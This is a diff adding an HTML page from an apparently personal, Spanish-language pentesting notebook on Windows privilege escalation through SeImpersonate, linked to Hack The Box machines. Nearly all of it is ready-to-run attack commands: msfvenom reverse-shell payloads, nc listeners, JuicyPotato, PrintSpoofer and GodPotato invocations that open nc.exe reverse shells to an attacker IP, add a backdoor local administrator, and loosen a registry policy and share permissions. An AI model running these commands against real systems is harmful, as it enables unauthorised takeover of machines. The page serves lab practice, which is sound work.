@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Impersonate | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="impersonate">
+          <div class="note-tabbar">
+            <span>Impersonate</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Privilegios</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / privilegios</p>
+            <h2>Impersonate</h2>
+
+            <h2><a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> / JuicyPotatoNG</h2>
+
+            <aside class="callout warning">
+              <p>SeImpersonatePrivilege permite suplantar tokens bajo ciertas condiciones; no es una shell SYSTEM automática. Las técnicas Potato/PrintSpoofer dependen del contexto del servicio, versión de Windows y mitigaciones aplicadas.</p>
+            </aside>
+
+            <p><a href="https://github.com/ivanitlearning/Juicy-Potato-x86/releases">Juicy Potato 32 Bits</a> <a href="https://github.com/int0x33/nc.exe/blob/master/nc.exe">NetCat 32 Bits</a></p>
+
+<ul>
+              <li><code>Windows 7, 8.1, 10(&lt;1809)</code><code>,Windows Server 2008/2012/2016</code></li>
+              <li><code>SeImpersonate</code> o  <code>SeAssignPrimaryToken</code></li>
+            </ul>
+
+            <section class="code-card">
+              <h3>Preparación</h3>
+              <pre><code># Payload
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f exe &gt; backdoor.exe
+# Subir nc/backdoor y JuicyPotato en una carpeta C:/temp
+upload /backdoor.exe .
+upload /nc.exe .
+upload /JuicyPotato.exe .
+# Listener
+rlwrap nc -nlvp 443</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>CMD: JuicyPotato Payloads</h3>
+              <pre><code># NetCat
+JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c C:\Windows\Temp\prives\nc.exe &lt;kali_ip&gt; 443 -e cmd.exe&quot; -t *
+
+# Backdoor
+JuicyPotato.exe -l 53375 -p backdoor.exe -t *
+JuicyPotato.exe -l 53375 -p C:\Windows\Temp\prives\backdoor.exe -t *
+
+# Agregar usuario y hacerlo Admin Local -&gt; Máquina Jeeves HTB (S4vitar)
+JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c net user alvaro ruiz123$! /add&quot; -t *
+JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c net localgroup Administrators alvaro /add&quot; -t *
+# Ajustes
+JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c reg add  HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f&quot; -t * # En caso de no aparecer el usuario como Pwned a pesar de ser ADMIN LOCAL
+JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL&quot; -t * # En caso de no obtener CMD a pesar de poner Pwned
+
+# Subir JuicyPotato.exe y nc.exe
+JuicyPotato.exe -l 53375  -p c:\windows\system32\cmd.exe -a &quot;/c C:\Windows\Temp\prives\nc.exe 10.10.16.69 443 -e cmd.exe&quot; -t *
+
+# CLSID manual (Sin el parámetro -c escoge uno por defecto: BITS)
+JuicyPotato.exe -l 53375 -p backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</code></pre>
+            </section>
+
+            <p><a href="http://ohpe.it/juicy-potato/CLSID/">CLSID</a> (identificador único global de objetos de clase COM) para los diferentes sistema operativo</p>
+
+            <section class="code-card">
+              <h3>JuicyPotato: Argumentos</h3>
+              <pre><code>-l: Cualquier puerto local para COM trigger -&gt; 1337 / 53375
+-p: Programa a ejecutar
+-t: Abusar de SeImpersonate o SeAssignPrimaryToken (* ambas)
+-a: Argumento de -p</code></pre>
+            </section>
+
+            <aside class="callout warning">
+              <p><strong>Error JuicyPotato -&gt; <a href="https://github.com/Re4son/Churrasco/raw/master/churrasco.exe">Churrasco</a></strong> The Image file C:... is valid, but is for a machine type other than the current machine. ``<code>python title:&quot;Churrasco&quot; churrasco.exe -d &lt;Payload&gt; </code>``</p>
+            </aside>
+
+            <h2><a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> / JuicyPotatoNG</h2>
+
+<ul>
+              <li><code>Windows 10, 11</code>, <code> Windows Server 2016, 2019, 2022</code></li>
+              <li><code>SeImpersonate</code> o  <code>SeAssignPrimaryToken</code></li>
+            </ul>
+
+            <section class="code-card">
+              <h3>CMD: PrintSpoofer con nc.exe</h3>
+              <pre><code># NC.exe
+PrintSpoofer.exe -c &quot;c:\temp\nc.exe &lt;kali_ip&gt; 443 -e cmd&quot;
+
+# Agregar usuario y hacerlo Admin Local -&gt; Máquina Jeeves HTB (S4vitar)
+PrintSpoofer.exe -c &quot;net user alvaro ruiz123$! /add&quot;
+PrintSpoofer.exe -c &quot;net localgroup Administrators alvaro /add&quot;
+# Ajustes: # En caso de no aparecer el usuario como Pwned a pesar de ser ADMIN LOCAL
+PrintSpoofer.exe -c &quot;reg add  HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f&quot;
+# En caso de no obtener CMD a pesar de poner Pwned
+PrintSpoofer.exe -c &quot;net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL&quot;</code></pre>
+            </section>
+
+            <h2><a href="https://github.com/BeichenDream/GodPotato">GodPotato</a> y <a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a></h2>
+
+            <section class="code-card">
+              <h3>PowerShell: Reverse Shell</h3>
+              <pre><code>GodPotato -cmd &quot;C:\Users\Public\reverse.exe&quot;
+# Kali: Payload y Listener
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f exe &gt; reverse.exe
+rlwrap nc -nlvp 443
+# A veces crear una shell se rompe y es mejor crear un usuario y hacerlo Administrator</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>PowerShell: Crear un usuario y hacerlo Administrator</h3>
+              <pre><code>GodPotato -cmd &quot;net user /add username Password123&quot;
+GodPotato -cmd &quot;net localgroup administrators /add username&quot;
+RunasCs.exe username Password123 &quot;C:/Users/Public/reverse.exe&quot; --force-profile --logon-type 8</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=bastard">Bastard</a>
+              <a href="/writeups.html?machine=bounty">Bounty</a>
+              <a href="/writeups.html?machine=devel">Devel</a>
+              <a href="/writeups.html?machine=flight">Flight</a>
+              <a href="/writeups.html?machine=grandpa">Grandpa</a>
+              <a href="/writeups.html?machine=jeeves">Jeeves</a>
+              <a href="/writeups.html?machine=querier">Querier</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>privilegios</span>
+              <span>impersonate</span>
+              <span>potato</span>
+              <span>juicypotato</span>
+              <span>printspoofer</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
